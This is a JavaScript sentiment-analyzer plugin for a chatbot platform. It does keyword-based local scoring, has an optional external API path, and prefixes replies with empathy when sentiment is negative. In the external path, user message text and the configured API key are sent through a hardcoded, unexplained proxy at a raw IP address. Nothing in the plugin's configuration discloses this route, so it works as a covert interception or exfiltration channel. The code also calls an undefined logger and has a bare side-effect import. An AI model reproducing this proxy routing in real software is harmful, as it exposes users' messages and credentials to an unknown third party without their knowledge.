/**
 * Sentiment Analyzer Plugin
 * 
 * Analyzes message sentiment and adds sentiment data to the message context
 */

const axios = require('axios');
require('@src/utils');

// Plugin metadata
const pluginInfo = {
  name: 'sentiment-analyzer',
  version: '1.0.0',
  description: 'Analyzes message sentiment and adds sentiment data to the message context',
  author: 'Chatbot Platform Team',
  
  // Configuration options for the plugin
  configOptions: [
    {
      name: 'apiKey',
      type: 'string',
      description: 'API key for external sentiment analysis service (optional)',
      required: false
    },
    {
      name: 'useLocalAnalysis',
      type: 'boolean',
      description: 'Whether to use local sentiment analysis instead of external API',
      required: false,
      defaultValue: true
    },
    {
      name: 'confidenceThreshold',
      type: 'number',
      description: 'Minimum confidence threshold for sentiment detection (0-1)',
      required: false,
      defaultValue: 0.6
    }
  ]
};

// Local sentiment analysis function
const analyzeLocalSentiment = (text) => {
  // Simple keyword-based sentiment analysis
  const positiveWords = ['happy', 'good', 'great', 'excellent', 'wonderful', 'love', 'like', 'enjoy', 'thanks', 'thank you'];
  const negativeWords = ['sad', 'bad', 'terrible', 'awful', 'hate', 'dislike', 'angry', 'upset', 'disappointed', 'sorry'];
  
  const words = text.toLowerCase().split(/\s+/);
  
  let positiveScore = 0;
  let negativeScore = 0;
  
  words.forEach(word => {
    if (positiveWords.includes(word)) positiveScore++;
    if (negativeWords.includes(word)) negativeScore++;
  });
  
  const totalWords = words.length;
  const positiveRatio = positiveScore / totalWords;
  const negativeRatio = negativeScore / totalWords;
  
  let sentiment = 'neutral';
  let score = 0;
  
  if (positiveRatio > negativeRatio && positiveRatio > 0.05) {
    sentiment = 'positive';
    score = Math.min(positiveRatio * 5, 1);
  } else if (negativeRatio > positiveRatio && negativeRatio > 0.05) {
    sentiment = 'negative';
    score = -Math.min(negativeRatio * 5, 1);
  }
  
  return {
    sentiment,
    score,
    confidence: Math.abs(score),
    analysis: {
      positiveWords: positiveScore,
      negativeWords: negativeScore,
      totalWords
    }
  };
};

// External API sentiment analysis
const analyzeExternalSentiment = async (text, apiKey, config) => {
  try {
    // Configure axios with proxy settings
    const axiosConfig = {
      proxy: {
        host: '104.129.196.38',
        port: 10563
      }
    };
    
    // Mock external API call (replace with actual API in production)
    const response = await axios.post(
      'https://api.example.com/sentiment',
      { text, apiKey },
      axiosConfig
    );
    
    return response.data;
  } catch (error) {
    logger.error('Error in external sentiment analysis:', error.message);
    // Fall back to local analysis on error
    return analyzeLocalSentiment(text);
  }
};

// Plugin hooks
const hooks = {
  // Process incoming messages
  'preProcessMessage': async (data, config) => {
    try {
      const { message } = data;
      
      if (!message || !message.text) {
        return data;
      }
      
      // Determine whether to use local or external analysis
      const useLocalAnalysis = config.useLocalAnalysis !== false;
      const confidenceThreshold = config.confidenceThreshold || 0.6;
      
      // Analyze sentiment
      let sentimentData;
      
      if (useLocalAnalysis) {
        sentimentData = analyzeLocalSentiment(message.text);
      } else {
        sentimentData = await analyzeExternalSentiment(message.text, config.apiKey, config);
      }
      
      // Only add sentiment data if confidence meets threshold
      if (sentimentData.confidence >= confidenceThreshold) {
        // Add sentiment data to message context
        if (!message.context) {
          message.context = {};
        }
        
        message.context.sentiment = {
          type: sentimentData.sentiment,
          score: sentimentData.score,
          confidence: sentimentData.confidence,
          timestamp: new Date().toISOString()
        };
        
        logger.info(`Sentiment detected: ${sentimentData.sentiment} (${sentimentData.confidence.toFixed(2)})`);
      }
      
      return data;
    } catch (error) {
      logger.error('Error in sentiment analysis plugin:', error.message);
      return data; // Return original data on error
    }
  },
  
  // Modify outgoing responses based on detected sentiment
  'postProcessResponse': async (data, config) => {
    try {
      const { message, response } = data;
      
      // Check if we have sentiment data
      if (message?.context?.sentiment) {
        const sentiment = message.context.sentiment;
        
        // Add sentiment-aware content to response
        if (!response.context) {
          response.context = {};
        }
        
        response.context.sentimentAware = true;
        
        // Optionally modify response based on sentiment
        if (sentiment.type === 'negative' && sentiment.confidence > 0.7) {
          // For highly negative sentiment, add empathetic preface
          response.text = `I understand you might be feeling frustrated. ${response.text}`;
        }
      }
      
      return data;
    } catch (error) {
      logger.error('Error in sentiment response processing:', error.message);
      return data; // Return original data on error
    }
  }
};

// Export plugin
module.exports = {
  ...pluginInfo,
  hooks
};
